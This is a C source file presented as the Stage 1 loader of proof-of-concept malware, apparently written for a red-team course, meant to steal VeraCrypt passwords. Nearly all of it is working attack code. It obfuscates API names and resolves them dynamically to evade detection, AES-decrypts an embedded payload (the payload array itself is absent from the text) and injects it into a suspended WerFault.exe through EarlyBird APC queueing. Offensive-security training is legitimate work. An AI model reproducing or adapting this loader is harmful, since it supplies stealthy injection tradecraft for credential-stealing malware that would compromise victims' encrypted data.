/*

 Title: VeraCrypt Sniffer
 Author: KrknSec
 Description: This PoC malware was created for the final assignment during the Sektor7 Red Team Operator Malware Intermediate course.
 The purpose of this application is to sniff out VeraCrypt passwords. This is achieved by hooking the MultiByteToWideChar API call that VeraCrypt
 utilizes after a user inputs their password. Additional explanation of components within this malware is below.

 VCLoader: This is Stage 1. This contains the encrypted Stage 2 payload. Using EarlyBird APC injection into WerFault.exe, Stage 2 will be loaded. Stage 2 is a DLL and
 is executed through the sRDI technique.

 VCMigrate: This is Stage 2. This is a DLL that will persist as WerFault.exe and will wait until it sees the VeraCrypt process. Once the VeraCrypt process
 is noticed, it will decrypt and perform a basic injection of Stage 3. Again Stage 3 is a DLL and uses sRDI.

 VCSniff: This is Stage 3. This is the final payload. Once injected into the VeraCrypt process, it will use IAT hooking to hook the MultiByteToWideChar API call
 and create a file in %APPDATA%\Temp\ folder containing the password.

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "obfuscate.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


//---------------------------------------------------------------------------------
// VCMIGRATE PAYLOAD - sRDI - 64-bit
// Contains the VCMigrate.dll and uses sRDI technique to run the main function.
//---------------------------------------------------------------------------------

unsigned char key[] = { 0xc9, 0xba, 0xd, 0xf3, 0x6a, 0x71, 0x97, 0x76, 0x4b, 0x9, 0xa5, 0xf2, 0x22, 0x34, 0x8e, 0x6a };

unsigned int payload_len = sizeof(payload);


//----------------------------------
// TYPEDEFS
// Typedefs for dynamic API loading
//----------------------------------
typedef BOOL (WINAPI * CreateProcessA_t)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef LPVOID (WINAPI * VirtualAllocEx_t)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL (WINAPI * WriteProcessMemory_t)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

typedef DWORD (WINAPI * QueueUserAPC_t)(
  PAPCFUNC  pfnAPC,
  HANDLE    hThread,
  ULONG_PTR dwData
);

typedef DWORD (WINAPI * ResumeThread_t)(
  HANDLE hThread
);

typedef BOOL (WINAPI * CryptAcquireContextW_t)(
  HCRYPTPROV *phProv,
  LPCWSTR    szContainer,
  LPCWSTR    szProvider,
  DWORD      dwProvType,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptCreateHash_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTKEY  hKey,
  DWORD      dwFlags,
  HCRYPTHASH *phHash
);

typedef BOOL (WINAPI * CryptHashData_t)(
  HCRYPTHASH hHash,
  const BYTE *pbData,
  DWORD      dwDataLen,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDeriveKey_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTHASH hBaseData,
  DWORD      dwFlags,
  HCRYPTKEY  *phKey
);

typedef BOOL (WINAPI * CryptDecrypt_t)(
  HCRYPTKEY  hKey,
  HCRYPTHASH hHash,
  BOOL       Final,
  DWORD      dwFlags,
  BYTE       *pbData,
  DWORD      *pdwDataLen
);

typedef BOOL (WINAPI * CryptReleaseContext_t)(
  HCRYPTPROV hProv,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDestroyHash_t)(
  HCRYPTHASH hHash
);

typedef BOOL (WINAPI * CryptDestroyKey_t)(
  HCRYPTKEY hKey
);

//--------------------------------------
// AES DECRYPTION
// Decrypts payload using AES-256 algo
//--------------------------------------
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	
	// Dynamically load functions
	HMODULE hAdvapi;
	hAdvapi = GetModuleHandle(AY_OBFUSCATE("Advapi32.dll"));
	CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptAcquireContextW"));
	CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptCreateHash"));
	CryptHashData_t pCryptHashData = (CryptHashData_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptHashData"));
	CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptDeriveKey"));
	CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptDecrypt"));
	CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptReleaseContext"));
  CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptDestroyHash"));
	CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t)GetProcAddress(hAdvapi, AY_OBFUSCATE("CryptDestroyKey"));
	
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!pCryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	pCryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	pCryptDestroyKey(hKey);
	
	return 0;
}


//----------------------------------------------------------
// MAIN FUNCTION
// Performs EarlyBird APC injection through WerFault.exe
//----------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

	// Dynamically load the APIs
	HMODULE hKernel;
	hKernel = GetModuleHandle(AY_OBFUSCATE("kernel32.dll"));
	CreateProcessA_t pCreateProcessA = (CreateProcessA_t)GetProcAddress(hKernel, AY_OBFUSCATE("CreateProcessA"));
	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(hKernel, AY_OBFUSCATE("VirtualAllocEx"));
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hKernel, AY_OBFUSCATE("WriteProcessMemory"));
	QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)GetProcAddress(hKernel, AY_OBFUSCATE("QueueUserAPC"));
	ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(hKernel, AY_OBFUSCATE("ResumeThread"));

	int pid = 0;
    HANDLE hProc = NULL;
	
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	void * pRemoteCode;
	
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	pCreateProcessA(0, "WerFault.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// Decrypt and inject payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));	
	
	// Allocate memory for payload and throw it in
	pRemoteCode = pVirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
	pResumeThread(pi.hThread);

	return 0;
}